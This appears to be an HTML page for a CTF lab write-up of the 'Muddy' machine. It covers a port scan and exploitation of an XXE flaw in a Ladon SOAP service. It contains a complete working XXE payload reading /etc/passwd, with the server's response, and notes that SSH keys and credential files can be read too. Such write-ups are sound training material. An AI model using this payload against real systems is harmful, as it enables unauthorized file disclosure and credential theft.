@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Muddy &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Muddy</h1>
+    
+    <div class="tags"><span class="tag">Linux</span><span class="tag">XXE</span><span class="tag">SOAP</span><span class="tag">Ladon</span><span class="tag">VirtualHost</span><span class="tag">LFI</span><span class="tag">InfoDisclosure</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#service-discovery-on-port-8888">Service Discovery on Port 8888</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#xxe-reading-etc-passwd-via-soap">XXE, Reading /etc/passwd via SOAP</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Muddy runs a Ladon SOAP web service on port 8888 that is vulnerable to XML External Entity (XXE) injection, allowing arbitrary local file reads. The initial scan also reveals the host uses a virtual hostname (<code>muddy.ugc</code>), which is needed to reach the service. These notes cover recon and the XXE LFI demonstration; privilege escalation and root are not documented.</p>
+<blockquote>
+<p><strong>Note:</strong> these notes are incomplete, covers recon through XXE file read on port 8888; privilege escalation and root are not documented.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp   open  smtp          Exim smtpd
+80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
+|_http-title: Did not follow redirect to http://muddy.ugc/
+111/tcp  open  rpcbind
+443/tcp  open  https?
+808/tcp  open  ccproxy-http?
+8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
+|_http-title: Ladon Service Catalog
+</code></pre>
+<p>Port 80 redirects to <code>http://muddy.ugc/</code>, indicating virtual host routing. Port 8888 runs a <strong>Ladon Service Catalog</strong>, a Python SOAP framework.</p>
+<p>The redirect from port 80 requires adding the hostname to <code>/etc/hosts</code>:</p>
+<pre><code>muddy.ugc -&gt; /etc/hosts
+</code></pre>
+<h3 id="service-discovery-on-port-8888">Service Discovery on Port 8888</h3>
+<p>Browsing to port 8888 at <code>muddy.ugc:8888</code> showed the Ladon Service Catalog listing. The available method was <code>checkout</code>.</p>
+<p>Searching for exploits:</p>
+<pre><code class="language-sh">searchsploit ladon
+Ladon Framework for Python 0.9.40 - XML External Entity Expansion  |  xml/webapps/43113.txt
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="xxe-reading-etc-passwd-via-soap">XXE, Reading /etc/passwd via SOAP</h3>
+<p>Ladon 0.9.40 does not disable external entity processing when parsing SOAP request bodies. Sending a crafted XML payload that defines an external entity pointing at a local file causes the server to include that file's contents in the response.</p>
+<blockquote>
+<p><strong>How XXE works in SOAP services:</strong> SOAP uses XML for its message format. XML parsers support external entities, references that load content from a URI, including <code>file://</code> paths. When a server doesn't disable this feature, an attacker can define <code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;</code> and reference <code>&amp;x;</code> in the request body. The XML parser resolves the entity before the application sees the data, injecting the file contents into the request that the application processes and reflects back.</p>
+</blockquote>
+<p>The PoC from the exploit DB used a <code>sayhello</code> method, but the Ladon service exposed <code>checkout</code>. I adapted the request accordingly and sent it through Burp:</p>
+<pre><code class="language-http">POST /muddy/soap HTTP/1.1
+Host: muddy.ugc:8888
+Content-Length: 541
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE uid
+    [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    ]&gt;
+    &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+    xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
+    xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+    xmlns:urn=&quot;urn:HelloService&quot;&gt;
+        &lt;soapenv:Header/&gt;
+        &lt;soapenv:Body&gt;
+        &lt;urn:checkout soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
+            &lt;uid xsi:type=&quot;xsd:string&quot;&gt;
+                &amp;passwd;
+            &lt;/uid&gt;
+        &lt;/urn:checkout&gt;
+    &lt;/soapenv:Body&gt;
+    &lt;/soapenv:Envelope&gt;
+</code></pre>
+<p>The server reflected <code>/etc/passwd</code> in the SOAP response body:</p>
+<pre><code class="language-http">HTTP/1.0 200 OK
+&lt;result&gt;Serial number: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+ian:x:1000:1000::/home/ian:/bin/sh
+...
+&lt;/result&gt;
+</code></pre>
+<p>The file read confirmed a user named <code>ian</code> with a shell. The XXE was used to read local files at will.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Ladon SOAP services are a niche but well-documented XXE target.</strong> <code>searchsploit ladon</code> surfaces the advisory immediately.</li>
+<li><strong>Adapt PoC method names to what the running service actually exposes.</strong> The example used <code>sayhello</code>; replacing it with the catalog's listed <code>checkout</code> method was the only modification required.</li>
+<li><strong>LFI through XXE enables reading any file the web service process can access</strong>, <code>/etc/passwd</code>, SSH private keys, config files with credentials. The user list from <code>/etc/passwd</code> defines the next targets.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
